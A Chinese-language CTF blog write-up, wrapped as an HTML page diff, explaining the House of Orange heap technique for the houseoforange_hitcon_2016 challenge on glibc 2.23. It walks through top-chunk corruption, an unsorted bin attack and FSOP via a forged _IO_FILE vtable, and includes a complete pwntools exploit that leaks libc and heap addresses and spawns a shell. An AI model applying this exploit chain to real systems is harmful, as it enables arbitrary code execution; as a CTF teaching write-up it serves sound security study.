@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    House of orange 丨
+    
+
+    St4rdd3n&#39;s blog
+  </title>
+
+  
+  <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">St4rdd3n&#39;s blog</a>
+    <ul class="nav">
+      
+      <li><a href="/tags">tags</a></li>
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">House of orange</div>
+  <div class="post-meta">
+    <div class="date">2024 December 10th</div>
+    <div class="tags">
+      
+      <div class="tag-item">pwn</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><p>就从分析一道例题开始吧。houseoforange_hitcon_2016（来自buu平台</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop$ checksec hoo</span><br><span class="line">[*] &#x27;/home/giantbranch/Desktop/hoo&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<p>保护全开，这是libc-2.23版本的一个利用方式。</p>
+<p>一开始我觉house of orange应该是一个提权的手法，事实上不是这样的。orange这个手法其实就是在没有free的情况下得到一个unsortedbin的堆块。如果要提权还需要结合其他方法去整，这道题就是用到了fsop去getshell。</p>
+<p>这个逆向自己逆，不多阐述，大概就是没有free，有个edit溢出写</p>
+<p>大白话：没有free的话可以通过修改符合条件的topchunksize，然后申请一个比topchunk大的堆块，topchunk就会被free掉</p>
+<p>条件:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MINSIZE&lt;old_top_size&lt;nb+MINSIZE</span><br><span class="line"></span><br><span class="line">old_top_size的prev_size位是1</span><br><span class="line"></span><br><span class="line">(old_top_size+old_top)&amp;0xfff=0x000</span><br><span class="line"></span><br><span class="line">nb&lt;0x20000</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;ffff\n&#x27;</span>, <span class="number">233</span>, <span class="number">56746</span>)</span><br><span class="line">pl = cyclic(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">56746</span>)</span><br><span class="line">pl += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(pl), pl, <span class="number">233</span>, <span class="number">56746</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;f\n&#x27;</span>, <span class="number">233</span>, <span class="number">56746</span>)</span><br></pre></td></tr></table></figure>
+
+<p>到这里house of orange就已经结束了，得到的结果是得到了一个ub的堆块。</p>
+<p> <img src="https://img.picui.cn/free/2024/12/10/67579dcba2303.png" alt="img"> </p>
+<p>然后是ub attack+fsop组合拳的getshell(在2.27之后这套组合拳已经不好用了，因为libc取消了abort刷新流的操作)</p>
+<p>利用链是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc =&gt; malloc_printerr =&gt; __libc_message =&gt; abort =&gt; _IO_flush_all_lockp</span><br></pre></td></tr></table></figure>
+
+<p>由于libc2.23版本没有对vtable的合法性检测，所以我们可以对整个iofile链进行伪造，思路：利用ubattack将_IO_list_all劫持为 main_arena +88，但是 main_arena 这附近是不可写的，but我们只是想劫持偏移为 0x68的地方， main_arena +88+0x68的地方放的是0x60大小smallbin的地方，我们申请一个堆块会遍历unsortedbin，如果不符合就放入largebin或者smallbin，那我们利用溢出将堆块的大小改为0x60即可完成chain上的修改，然后伪造vtable然后再伪造vt的内容就可以完成劫持</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./hoo&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./hoo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.buuoj.cn&#x27;,28130)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">cho</span>):</span><br><span class="line">	sla(<span class="string">&#x27;Your choice : &#x27;</span>,cho)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content,price,cl</span>):</span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Length of name :&#x27;</span>,size)</span><br><span class="line">	sla(<span class="string">&#x27;Name :&#x27;</span>,content)</span><br><span class="line">	sla(<span class="string">&#x27;Price of Orange:&#x27;</span>,price)</span><br><span class="line">	sla(<span class="string">&quot;Color of Orange:&quot;</span>,cl)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content,price,color</span>):</span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Length of name :&#x27;</span>,size)</span><br><span class="line">	p.sendafter(<span class="string">&quot;Name:&quot;</span>, content)</span><br><span class="line">	sla(<span class="string">&quot;Price of Orange: &quot;</span>, <span class="built_in">str</span>(price))</span><br><span class="line">	sla(<span class="string">&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	add(<span class="number">0x30</span>, <span class="string">&#x27;ffff\n&#x27;</span>, <span class="number">233</span>, <span class="number">56746</span>)</span><br><span class="line">	pl = cyclic(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">56746</span>)</span><br><span class="line">	pl += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0xf81</span>)</span><br><span class="line">	edit(<span class="built_in">len</span>(pl), pl, <span class="number">233</span>, <span class="number">56746</span>)</span><br><span class="line">	add(<span class="number">0x1000</span>, <span class="string">&#x27;f\n&#x27;</span>, <span class="number">233</span>, <span class="number">56746</span>)</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	add(<span class="number">0x400</span>, <span class="string">&#x27;f&#x27;</span>*<span class="number">8</span>, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line">	show()</span><br><span class="line">	ru(<span class="string">&#x27;ffffffff\n&#x27;</span>)</span><br><span class="line">	libcbase = uu64(<span class="string">&#x27;\x00&#x27;</span>+r(<span class="number">5</span>)) - <span class="number">0x3C5100</span></span><br><span class="line">	leak(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">	_IO_list_all = libcbase + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">	system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	leak(<span class="string">&#x27;all&#x27;</span>,_IO_list_all)</span><br><span class="line">	leak(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">	edit(<span class="number">0x10</span>, <span class="string">&#x27;f&#x27;</span>*<span class="number">0x10</span>, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line">	show()</span><br><span class="line">	ru(<span class="string">&#x27;ffffffffffffffff&#x27;</span>)</span><br><span class="line">	heapaddr = uu64(r(<span class="number">6</span>)) - <span class="number">0xe0</span></span><br><span class="line">	leak(<span class="string">&#x27;heapaddr&#x27;</span>,heapaddr)</span><br><span class="line">	</span><br><span class="line">	orange = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>)</span><br><span class="line">	orange += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">	orange = orange.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">	orange += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(heapaddr + <span class="number">0x5E8</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(system)</span><br><span class="line">	payload = cyclic(<span class="number">0x400</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">56746</span>) </span><br><span class="line">	payload += p64(<span class="number">0</span>) + orange</span><br><span class="line">	</span><br><span class="line">	edit(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">56746</span>)</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#</span></span><br><span class="line">	itr()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">i = 0</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">	i += 1</span></span><br><span class="line"><span class="string">	log.warn(str(i))</span></span><br><span class="line"><span class="string">	try:  </span></span><br><span class="line"><span class="string">		pwn()</span></span><br><span class="line"><span class="string">	except Exception:</span></span><br><span class="line"><span class="string">		p.close()</span></span><br><span class="line"><span class="string">		if(local == 1):</span></span><br><span class="line"><span class="string">			p = process(binary)</span></span><br><span class="line"><span class="string">		else:</span></span><br><span class="line"><span class="string">			p = remote(ip,port)</span></span><br><span class="line"><span class="string">		continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © St4rdd3n</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
